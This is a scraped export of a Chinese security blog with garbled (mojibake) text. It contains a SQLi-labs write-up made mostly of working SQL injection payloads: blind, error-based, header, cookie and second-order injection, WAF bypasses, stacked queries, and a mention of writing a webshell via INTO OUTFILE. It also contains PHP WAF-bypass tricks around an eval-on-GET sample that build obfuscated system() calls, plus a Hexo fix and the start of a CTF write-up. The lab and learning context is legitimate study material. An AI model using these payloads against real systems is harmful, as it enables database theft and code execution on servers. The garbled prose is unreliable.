1\u0026#34;)unionselectcount(*),concat((selectuser()),floor(rand(0)*2))xfrominformation_schema.columnsgroupbyx#Less-13 1') or 1=1# æˆåŠŸç™»å½•ï¼ŒæŠ¥é”™æ³¨å…¥æˆåŠŸä½†æ˜¯ä¸å›æ˜¾ï¼Œå¯ä»¥è€ƒè™‘ç›²æ³¨\n1') or ascii(substr((database()),1,1))\u0026gt;100# Less-14 1\u0026quot; or 1=1# æˆåŠŸç™»å½•ï¼Œä¾ç„¶ä¸èƒ½å›æ˜¾ï¼Œå°è¯•ä½¿ç”¨å¸ƒå°”ç›²æ³¨\n1\u0026#34; or left(database(),1)=\u0026#39;s\u0026#39;# å‘ç°å¯ä»¥ç”¨updatexmlè¿›è¡ŒæŠ¥é”™æ³¨å…¥\n1\u0026#34; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)# Less-15 1\u0026#39; or 1=1# æˆåŠŸç™»å½•ï¼Œå¸ƒå°”æ³¨å…¥æˆ–è€…æ—¶é—´ç›²æ³¨å‡å¯è¡Œ\n1\u0026#39; or left(database(),1)=\u0026#39;s\u0026#39;# admin\u0026#39;andIf(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))#Less-16 1\u0026quot;) or 1=1# æˆåŠŸç™»å½•ï¼Œå¸ƒå°”æ³¨å…¥æˆ–è€…æ—¶é—´ç›²æ³¨å‡å¯è¡Œ\n1\u0026#34;) or left(database(),1)=\u0026#39;s\u0026#39;# admin\u0026#34;)andIf(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))#Less-17 updateæ³¨å…¥ï¼Œusernameè¿‡æ»¤äº†å¾ˆå¤šï¼Œæœ‰passwordé”™è¯¯å›æ˜¾ï¼Œè€ƒè™‘ç”¨æŠ¥é”™æ³¨å…¥\n1\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)# Less-18 ç™»å½•æˆåŠŸåï¼Œé¡µé¢æç¤º\nYour IP ADDRESS is: 172.17.0.1 Your User Agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 é‚£ä¹ˆæœ‰å¯èƒ½æ˜¯ ip æˆ–è€… UA æ³¨å…¥ï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°æ˜¯ä¸ª Header å¤´æ³¨å…¥ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„è¿™æ˜¯ç™»å½•æˆåŠŸçš„æ¡ä»¶ä¸‹æ‰èƒ½è§¦å‘çš„ï¼Œè€Œä¸”æ—¢ç„¶æ˜¯insertæ³¨å…¥ï¼Œéœ€è¦ç”¨'1'='1é—­åˆåé¢çš„ sql è¯­å¥ï¼Œå¦åˆ™å°±æ˜¯è¯­æ³•é”™è¯¯äº†\n\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1),\u0026#34;1\u0026#34;,\u0026#34;1\u0026#34;)# Less-19 ç™»å½•æˆåŠŸåæç¤º\nYour IP ADDRESS is: 172.17.0.1 Your Referer is: http://localhost:8081/Less-19/ äºæ˜¯æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯åœ¨Refereråº”è¯¥æœ‰æ³¨å…¥ç‚¹ï¼Œåœ¨ Referer å¤„åŒæ ·ç”¨\n\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1å¯ä»¥æ³¨å…¥\nLess-20 cookie æ³¨å…¥ï¼Œç™»å½•æˆåŠŸåä¿®æ”¹ cookie å³å¯\n\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1Less-21 ç™»å½•æˆåŠŸåå‘ç° cookie åŠ ä¸Šäº† base64\nYOUR COOKIE : uname = YWRtaW4= ç”¨ä¸Šé¢çš„ payload è¿›è¡Œ base64 ç¼–ç å°±è¡Œäº†ï¼Œè®°å¾—=è¦ urlencode\nJyBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQHZlcnNpb24pLDB4N2UpLDEpIGFuZCAnMSc9JzE%3d Less-22 åŒ 21 ï¼Œå•å¼•å·æ¢æˆåŒå¼•å·å³å¯\nIiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQHZlcnNpb24pLDB4N2UpLDEpIGFuZCAiMSI9IjE%3d Less-23 è¿™é‡Œ#ã€--+å‡è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨or \u0026quot;1\u0026quot;=\u0026quot;1æ¥é—­åˆåé¢çš„åŒå¼•å·ä¹Ÿå¯ä»¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„\n-1\u0026#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or \u0026#39;1\u0026#39;=\u0026#39;1Less-24 è¿™é‡Œæ˜¯ä¸ªäºŒæ¬¡æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ³¨å†Œä¸€ä¸ªadmin'#çš„è´¦å·ï¼Œåœ¨ä¿®æ”¹å¯†ç å¤„æˆ‘ä»¬å°±å¯ä»¥ä»¥è‡ªå·±çš„å¯†ç ä¿®æ”¹ admin çš„å¯†ç äº†ï¼Œå› ä¸ºä¿®æ”¹å¯†ç å¤„å½¢æˆçš„ sql è¯­å¥æ˜¯\nUPDATEusersSETpasswd=\u0026#34;New_Pass\u0026#34;WHEREusername=\u0026#39;admin\u0026#39;#\u0026#39;xxxx è¿™æ ·#å°±æ³¨é‡Šæ‰äº†åé¢çš„ sql è¯­å¥\nLess-25 é¢˜ç›®å¾ˆç›´æ¥ï¼Œæç¤ºç›´æ¥æŠŠ orã€andè¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨\u0026amp;\u0026amp;ã€||ç»•è¿‡\nadmin\u0026#39;||updatexml(1,concat(0x7e,(select @@version),0x7e),1)# ä¹Ÿå¯ä»¥åŒå†™ç»•è¿‡\n0\u0026#39; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata;# Less-25a -1unionselect1,2,group_concat(schema_name)frominfoorrmation_schema.schemata%23Less-26 é¢˜ç›®æç¤ºç©ºæ ¼ä¸æ³¨é‡Šè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨%0aç»•è¿‡ï¼Œå¯ä»¥ç›²æ³¨ä¹Ÿå¯ä»¥æŠ¥é”™æ³¨å…¥\n0'||left(database(),1)\u0026gt;'s'%26%26'1'='1\t0'||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||'1'='1 Less-26a é¢˜ç›®æç¤ºç©ºæ ¼ä¸æ³¨é‡Šè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨%a0ç»•è¿‡ï¼ŒæŠ¥é”™æ³¨å…¥ä¸å‡ºï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨\n0'||'1'='1\t#æ¢æµ‹ä¸º' 0'||left(database(),1)='s'%26%26'1'='1 ç™½ç›’å®¡è®¡çŸ¥é“æ˜¯') 0%27)%a0union%a0select%a01,database(),2||('1 0%27)%a0union%a0select%a01,database(),2;%00 Less-27 é¢˜ç›®æç¤ºunionä¸selectè¢«è¿‡æ»¤äº†ï¼Œå¯ç”¨å¤§å°å†™ç»•è¿‡\n0'||'1'='1 0'||left(database(),1)='s'%26%26'1'='1 0'%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 Less-27a å¢åŠ äº†\u0026quot;\n0\u0026quot;%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 Less-28 union selectå¤§å°å†™å‡è¢«è¿‡æ»¤ï¼Œä½†æ˜¯selectè¿˜å¯å•ç‹¬ç”¨ï¼Œç›²æ³¨å³å¯\n0')||left(database(),1)\u0026gt;'s';%00 Less-28a ä¾ç„¶å¯ä»¥ç”¨ç›²æ³¨\n0')||left((database()),1)='s';%00 0')||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)\u0026lt;'s';%00 Less-29 åˆ©ç”¨tomcatä¸apacheè§£æç›¸åŒè¯·æ±‚å‚æ•°ä¸åŒçš„ç‰¹æ€§ï¼Œtomcatè§£æç›¸åŒè¯·æ±‚å‚æ•°å–ç¬¬ä¸€ä¸ªï¼Œè€Œapacheå–ç¬¬äºŒä¸ªï¼Œå¦‚?id=1\u0026amp;id=2ï¼Œtomcatå–å¾—1ï¼Œapacheå–å¾—2\n?id=1\u0026amp;id=0' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-30 ä¸ 29 æ¶æ„ä¸€æ ·ï¼ŒåŸç†ä¸€è‡´åªä¸è¿‡åŠ äº†\u0026quot;é™åˆ¶\n?id=1\u0026amp;id=0\u0026quot; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-31 æ¶æ„ä¸€æ ·ï¼Œå¤šäº†\u0026quot;)\n?id=1\u0026amp;id=0\u0026quot;) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-32 æ³¨æ„æ˜¯GBKï¼Œå¯ä»¥ç”¨%dfè¿›è¡Œå®½å­—èŠ‚æ³¨å…¥\n0%df%27%20or%201=1%23 0%df' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-33 0%df' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-34 uname=0%df'%20union+selEct%201,group_concat(schema_name)%20from%20information_schema.schemata%3b%23\u0026amp;passwd=1\u0026amp;submit=Submit Less-35 0 union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-36 0%df%27%20union%20selEct%201,group_concat(schema_name),2%20from%20information_schema.schemata;%23 -1%EF%BF%BD%27union%20select%201,user(),3--+ Less-37 uname=0%df%27%20union%20selEct%20group_concat(schema_name),2%20from%20information_schema.schemata;%23\u0026amp;passwd=1\u0026amp;submit=Submit Less-38 å †å æ³¨å…¥ï¼ŒæˆåŠŸåˆ›å»ºtestæ•°æ®è¡¨\n1';create table test like users;%23 Less-39 1;create table test39 like users;%23 Less-40 1');create table test40 like users;%23 Less-41 1;create table test41 like users;%23 Less-42 passwordå¤„æ— è¿‡æ»¤\nlogin_user=1\u0026amp;login_password=1'%3bcreate+table+test43+like+users%3b%23\u0026amp;mysubmit=Login Less-43 passwordå¤„æ— è¿‡æ»¤\nlogin_user=1\u0026amp;login_password=1')%3bcreate+table+test43+like+users%3b%23\u0026amp;mysubmit=Login Less-44 login_user=1\u0026amp;login_password=1'%3bcreate+table+test44+like+users%3b%23\u0026amp;mysubmit=Login Less-45 login_user=1\u0026amp;login_password=1')%3bcreate+table+test45+like+users%3b%23\u0026amp;mysubmit=Login Less-46 order byæ³¨å…¥\nusernameã€passwordå‡ä¸ºåˆ—åï¼Œæ‰€ä»¥ä»¥ä¸‹éœ€è¦çŸ¥é“åˆ—å\n?order=if(1=1,username,password) ?order=null,if(1=1,username,password) ?order=(case when (1=1) then username else password end) ?order=ifnull(null, username) ?order=rand(1=1) //order by rand(1)/rand(0)ä¸¤è€…è¿”å›ä¸ä¸€æ · ?order=(select 1 regexp if(1=1,1,0x00)) å°†1=1æ¢æˆboolç›²æ³¨çš„è¯­å¥å‡½æ•°å³å¯ç”¨äºè·å–æ•°æ® sort=rand(ascii(database(),1))=115)\næ—¶é—´ç›²æ³¨\nsort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5)) sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5('1')),null) from (select database() as current) as tb1) Bool ç›²æ³¨\nrand(ascii(left(database()),1))=115) æŠ¥é”™æ³¨å…¥ï¼š\nupdatexml(1,if(1=1,concat(0x7e,version()),2),1) (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) procedure analyse å‚æ•°åæ³¨å…¥\nsort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) into outfileå‚æ•°:\nid=1 into outfield \u0026quot;path\u0026quot; ä¸Šä¼ ç½‘é©¬ï¼Œå¯ä»¥åœ¨åé¢åŠ ä¸Šlines terminated by 16è¿›åˆ¶è½¬ç çš„æ•°æ®\nLess-47 æœ‰'ï¼Œå¯ä»¥ç”¨æŠ¥é”™\n1'and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+ 1'and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+ ä¹Ÿå¯ä»¥ç”¨æ—¶é—´ç›²æ³¨\n1'and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+ procedure analyse å‚æ•°åæ³¨å…¥\n1'procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+ Less-48 1 and If(ascii(substr(database(),1,1))\u0026gt;115,0,sleep (5))--+ sort=rand(ascii(left(database(),1))=115) Less-49 1' and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+ 1' and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+ Less-50 å †å æ³¨å…¥\n1;create table test50 like users;%23 Less-51 1';create table test51 like users;%23 Less-52 1;create table test52 like users;%23 Less-53 1';create table test53 like users;%23 ","date":"2019-03-03T22:31:20Z","permalink":"https://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%951-53/","title":"Sqli-labé€Ÿåˆ·è®°å½•(1-53)"},{"content":"èµ·å› æ˜¯å¹´å‰çœ‹äº†ä¸€ç¯‡How To Exploit PHP Remotely To Bypass Filters \u0026amp; WAF Rulesï¼Œç°åœ¨æœäº†ä¸€ä¸‹å‘ç°å·²ç»æœ‰ç¿»è¯‘äº†ã€‚æ„Ÿè§‰å‡åä¹Ÿæ²¡ä»€ä¹ˆå¥½æ‰©å±•çš„ï¼Œä¹Ÿä¸å¤ªå¥½æ‹¿å»æŠ•ç¨¿äº†ï¼Œæ€è€ƒäº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿˜æ˜¯å½“ä½œå­¦ä¹ ç¬”è®°æ¥å†™ç®—äº†ã€‚\nä»¥ä¸‹å®ç°ç¯å¢ƒå‡åœ¨ php 7.0.31 ç‰ˆæœ¬ä¸Šï¼Œå¹¶ä¸”æŠŠ waf å› ç´ è€ƒè™‘åœ¨å†…ã€‚\nå¼•å…¥ é¦–å…ˆæ¥çœ‹ä¸€æ®µ php ä»£ç :\n\u0026lt;?php if(preg_match(\u0026#39;/system|exec|passthru/\u0026#39;,$_GET[\u0026#39;code\u0026#39;])){ echo \u0026#39;invalid syntax\u0026#39;; } else { eval($_GET[\u0026#39;code\u0026#39;]); } æ‰§è¡Œå‘½ä»¤ä¸åªè¿™å‡ ä¸ªå‡½æ•°ï¼Œè¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±æ‹¿è¿™å‡ ä¸ªæ¥ä¸¾ä¾‹ã€‚æ¯«æ— ç–‘é—®ï¼Œè¿™é‡Œè‚¯å®šæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚\né‚£æˆ‘ä»¬å…ˆç›´æ¥å°è¯•è¯»å–/etc/passwdï¼Œæ˜¾ç„¶ï¼Œè¿™é‡Œè¿˜æ²¡åˆ°ä»£ç å±‚é¢å°±ç›´æ¥è¢« waf äº†ã€‚\n \nåŸå› å¯èƒ½æ˜¯å› ä¸º/etc/passwdçš„æ•æ„ŸåŸå› \nç»•è¿‡ waf é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å…ˆå°è¯•ç»•è¿‡ waf ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨/etc/pas\\swdç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ç©ºå˜é‡ï¼Œå½“ç„¶æ–¹æ³•å¾ˆå¤š\n \nå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬æ˜¯æˆåŠŸç»•è¿‡ waf ï¼Œæ¥åˆ°äº†ä»£ç å±‚é¢ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘æ€ä¹ˆç»•è¿‡å‘½ä»¤æ‰§è¡Œå‡½æ•°äº†\nPHP è½¬ä¹‰åºåˆ— åœ¨è°ˆç»•è¿‡å‡½æ•°è¿‡æ»¤å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ PHP çš„è½¬ä¹‰åºåˆ—ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä½¿ç”¨åæ–œçº¿è½¬ä¹‰å„ç§å­—ç¬¦å½¢æˆç‰¹å®šçš„æ„ä¹‰ã€‚æ¯”å¦‚è¯´ï¼š\n \\040 ç©ºæ ¼çš„å¦å¤–ä¸€ç§ç”¨æ³• ä»¥å…«è¿›åˆ¶è¡¨ç¤ºçš„\\[0â€“7]{1,3}è½¬ä¹‰å­—ç¬¦ä¼šè‡ªåŠ¨é€‚é…äºŒè¿›åˆ¶å­—ç¬¦ï¼ˆå¦‚\\377ï¼Œå…«è¿›åˆ¶377æ˜¯10è¿›åˆ¶255ï¼Œ å› æ­¤ä»£è¡¨ä¸€ä¸ªå…¨1çš„å­—ç¬¦ï¼‰ \\x[0â€“9A-Fa-f]{1,2} è¡¨ç¤ºåå…­è¿›åˆ¶è½¬ä¹‰å­—ç¬¦è¡¨ç¤ºæ³•ï¼ˆå¦‚\\x41ï¼‰ ä»¥Unicodeè¡¨ç¤ºçš„\\u{[0â€“9A-Fa-f]+}å­—ç¬¦ï¼Œä¼šè¾“å‡ºä¸ºUTF-8å­—ç¬¦ä¸²  è™½ç„¶çœ‹èµ·æ¥å¾ˆæ™®é€šï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å„ç§è¯­æ³•æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œå†é…åˆ php å¯å˜å‡½æ•°æ¥ç»•è¿‡å„ç§é˜²å¾¡\nphp å¯å˜å‡½æ•°  â€‹\tPHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚\nå¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequire ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚\n çœ‹ä¸€ä¸‹å®˜æ–¹ç¤ºä¾‹\n\u0026lt;?php function foo() { echo \u0026#34;In foo()\u0026lt;br /\u0026gt;\\n\u0026#34;; } function bar($arg = \u0026#39;\u0026#39;) { echo \u0026#34;In bar(); argument was \u0026#39;$arg\u0026#39;.\u0026lt;br /\u0026gt;\\n\u0026#34;; } // ä½¿ç”¨ echo çš„åŒ…è£…å‡½æ•° function echoit($string) { echo $string; } $func = \u0026#39;foo\u0026#39;; $func(); // This calls foo()  $func = \u0026#39;bar\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls bar()  $func = \u0026#39;echoit\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls echoit() ?\u0026gt;ä¹Ÿå°±æ˜¯è¯´$var(args)è·Ÿâ€œstringâ€(args);æ˜¯ä¸function(args)ç­‰æ•ˆçš„ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥æœ‰\n \nå°è¯•\u0026quot;\\x73\\x79\\x73\\x74\\x65\\x6d\u0026quot;(\u0026quot;whoami\u0026quot;)\n \nç¡®å®å¯ä»¥æ‰§è¡Œæ— è¯¯ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ç»•è¿‡å¯¹systemçš„æ£€æµ‹äº†\n \næ”¹è¿›è¾“å…¥æ£€æµ‹ ä¸Šè¿°æˆ‘ä»¬çš„ payload ä¸­è¿˜æ˜¯ç”¨åˆ°äº†åŒå¼•å·ï¼Œè€Œå¤§å¤šæ•°çš„æ—¶å€™ waf ä¸ä¼šå…è®¸ä½¿ç”¨åŒå¼•å·çš„ï¼Œæˆ‘ä»¬å°† php æ–‡ä»¶å†…å®¹ä¿®æ”¹ä¸º\n\u0026lt;?php if(preg_match(\u0026#39;/system|exec|passthru|[\\\u0026#34;\\\u0026#39;]/\u0026#39;,$_GET[\u0026#39;code\u0026#39;])){ echo \u0026#39;invalid syntax\u0026#39;; } else { eval($_GET[\u0026#39;code\u0026#39;]); } å¢åŠ äº†å¯¹å•å¼•å·ä¸åŒå¼•å·çš„æ£€æµ‹ï¼Œè¿™æ—¶å€™åº”è¯¥æ€ä¹ˆåŠå‘¢\nè®©æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸ªç‰¹æ€§\n \nä¹Ÿå°±æ˜¯è¯´åœ¨ PHP ä¸­ï¼Œå­—ç¬¦ä¸²è¡¨è¾¾å¯ä»¥æœ‰ä»¥ä¸Šè¿™å‡ ç§æ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸Šçš„æ–¹å¼å°è¯•æ›¿ä»£åŒå¼•å·ã€‚ç¬¬ä¸€ç§æ˜¯ç±»ä¼¼(system)(whoami);ï¼Œç„¶è€Œåœ¨ php ä¸­æˆ‘ä»¬å¯ä»¥ç”¨.æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œäºæ˜¯ä¹Ÿå¯ä»¥æœ‰(sys.(te).m)(whoami);\n \nä¹Ÿå¯ä»¥ä½¿ç”¨/?a=system\u0026amp;b=ls\u0026amp;code=$_GET[a]($_GET[b]);çš„è§£ææ–¹æ³•æ¥ç»•è¿‡\n \nè¿™é‡Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€å·§ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°åå’Œå‚æ•°å†…æ’å…¥æ³¨é‡Šï¼ˆè¿™ç§æ–¹æ³•åœ¨ç»•è¿‡æŸäº›WAFè§„åˆ™é›†æ–¹é¢éå¸¸æœ‰ç”¨ï¼Œè¿™äº›è§„åˆ™é›†ä¼šæ‹¦æˆªç‰¹å®šçš„PHPå‡½æ•°å\nphp -r \u0026quot;echo/*this is a comment*/(foo);\u0026quot; php -r \u0026quot;system/*this is a comment*/(whoami);\u0026quot; php -r \u0026quot;system/*this is a comment*/(wh./*foo*/(oa)/*bar*/.mi);\u0026quot; php -r \u0026quot;(s/*foo*/.(ys)./*bar*/tem)/*this is a comment*/(wh./*foo*/(oa)/*bar*/.mi);\u0026quot;  \n \nget_defined_functions  â€‹\t(PHP 4 \u0026gt;= 4.0.4, PHP 5, PHP 7)\nâ€‹\tget_defined_functions â€” è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„\nâ€‹\tget_defined_functions ([ bool $exclude_disabled = FALSE ] ) : array\nâ€‹\tè·å–æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„ã€‚\n è¿™ä¸ªå‡½æ•°æ˜¯å¯å°†ç”¨æˆ·å®šä¹‰çš„å’Œå†…ç½®å‡½æ•°å‡è¿”å›çš„ã€‚è·å–å†…ç½®å‡½æ•°å¯ä»¥ä½¿ç”¨$arr[â€œinternalâ€]ï¼Œè·å–ç”¨æˆ·å®šä¹‰çš„å‡½æ•°å¯ä»¥ä½¿ç”¨$arr[â€œuserâ€]ã€‚\n \næ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•æ‰¾åˆ°systemå‡½æ•°\n \né…åˆå‰é¢çš„æ–¹æ³•ï¼Œæ•ˆæœæ‹”ç¾¤ï¼Œä¸è¿‡systemå‡½æ•°ä¸ä¸€å®šéƒ½æ˜¯ 1077 ï¼Œä½¿ç”¨çš„æ—¶å€™æœ€å¥½å¯ä»¥grepæŸ¥æ‰¾ä¸€ä¸‹systemå‡½æ•°çš„ä¸‹æ ‡\n \nå­—ç¬¦æ•°ç»„ æˆ‘ä»¬å¯ä»¥å°†PHPä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸²å½“æˆä¸€ç»„å­—ç¬¦æ¥ä½¿ç”¨ï¼ˆåŸºæœ¬ä¸Šä¸ Python ç›¸åŒï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥ä½¿ç”¨$string[2]æˆ–è€…$string[-3]è¯­æ³•æ¥å¼•ç”¨å•ä¸ªå­—ç¬¦ã€‚è¿™ç§æ–¹æ³•ä¹Ÿæœ‰å¯èƒ½ç»•è¿‡åŸºäºPHPå‡½æ•°åçš„é˜²æŠ¤è§„åˆ™ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨$a=\u0026quot;eimstdy\u0026quot;;è¿™ä¸ªå­—ç¬¦ä¸²æ„é€ å‡ºsystem(\u0026quot;id\u0026quot;);è¯­å¥ã€‚éœ€è¦ç©ºæ ¼çš„è¯å°±åœ¨$aä¸­åŠ å…¥ç©ºæ ¼å°±å¥½äº†ã€‚\nä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›å†…ç½®å˜é‡ï¼Œä¸å†èµ˜è¿°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\n \n \nå‚è€ƒ How To Exploit PHP Remotely To Bypass Filters \u0026amp; WAF Rules\n","date":"2019-02-28T17:53:59Z","permalink":"https://blog.zeddyu.info/2019/02/28/Some-Tricks-of-Bypass-php-waf/","title":"Some Tricks of Bypass php waf"},{"content":"å‰å‡ å¤©å†™ writeup ï¼Œåœ¨ç”¨hexo gçš„æ—¶å€™ï¼Œç¢°åˆ°äº†Template render errorçš„é”™è¯¯åœ¨è¿™è®°å½•ä¸€ä¸‹\né—®é¢˜æè¿° ä½¿ç”¨hexo gçš„æ—¶å€™ï¼Œç¢°åˆ°äº†Template render errorçš„é”™è¯¯\n \näººè‚‰æºä»£ç reviewï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ²¡æœ‰é—­åˆçš„markdownç¬¦å·å•¥çš„ï¼Œè€Œå®˜æ–¹ç»™çš„solutionå®Œå…¨æ²¡æœ‰ç”¨ï¼Œå› ä¸ºæˆ‘æŠŠè¿™ç¯‡æ–‡ç« ä»source/_postä¸­ç§»é™¤ï¼Œå°±å®Œç¾æ²¡æœ‰é”™è¯¯äº†ï¼Œæ’é™¤äº†_config.ymlçš„é”™è¯¯ã€‚\nå‘ç°é—®é¢˜ å½“æ–‡ç« ä¸­æœ‰}}æ—¶,ä¸”è¿™ä¸¤ä¸ªæ‹¬å·æœªè¢«ä»£ç å—åŒ…å«ï¼Œè§£æä¼šå‡ºé—®é¢˜ã€‚ä½†æ˜¯æœ‰æ—¶å€™è§£æå¹¶æ²¡æœ‰å‡ºé—®é¢˜ï¼Œå°±æ¯”è¾ƒå¥‡æ€ªï¼Œæ²¡æœ‰æ·±ç©¶ï¼Œé‡åˆ°è¯¥é—®é¢˜çš„å¯ä»¥æŒ‰ç…§è¿™ç§æ–¹æ³•æ’é™¤ä¸€ä¸‹\nè§£å†³æ–¹æ³• æŠŠ/{{config}}åŒ…å«åœ¨ä»£ç å—ä¸­ï¼Œå¦‚\n{% raw %} å«æœ‰åŒå¤§æ‹¬å·çš„å†…å®¹ {% endraw %} å‚è€ƒ Hexoçš„ä¸€ä¸ªå°BUG(Template render error)\n","date":"2019-02-27T23:39:54Z","permalink":"https://blog.zeddyu.info/2019/02/27/Hexo-issue/","title":"Hexo Template render error è§£å†³æ–¹æ¡ˆ"},{"content":"[TOC]\nHgame 2019 Web wirteup\nWeek 1 Web è°åƒäº†æˆ‘çš„ flag  å‘œå‘œå‘œï¼ŒMki ä¸€èµ·åºŠå‘ç°å†™å¥½çš„é¢˜ç›®å˜æˆè¿™æ ·äº†ï¼Œæ˜¯å› ä¸ºæ˜¨å¤©æ²¡æœ‰å¥½å¥½å…³æœºå— T_T\nhint: æ®å½“äº‹äººå›å¿†ï¼Œé‚£ä¸ªå¤œæ™šä»–æ­£åœ¨ç”¨ vim ç¼–å†™é¢˜ç›®é¡µé¢ï¼Œä¼¼ä¹æ²¡æœ‰ä¿å­˜å°±å…³æœºç¡è§‰å»äº†,ç°åœ¨å°±æ˜¯åæ‚”ï¼Œååˆ†çš„åæ‚”ã€‚\n æ—¢ç„¶æç¤º vim ï¼Œé‚£å°±ç›´æ¥ä¸‹è½½.index.html.swpï¼Œç”¨vim -r .index.html.swpæ¢å¤å°±å¥½äº†ï¼Œå¾—åˆ°\n\u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;è°åƒäº†æˆ‘çš„flag???\u0026lt;/title\u0026gt; 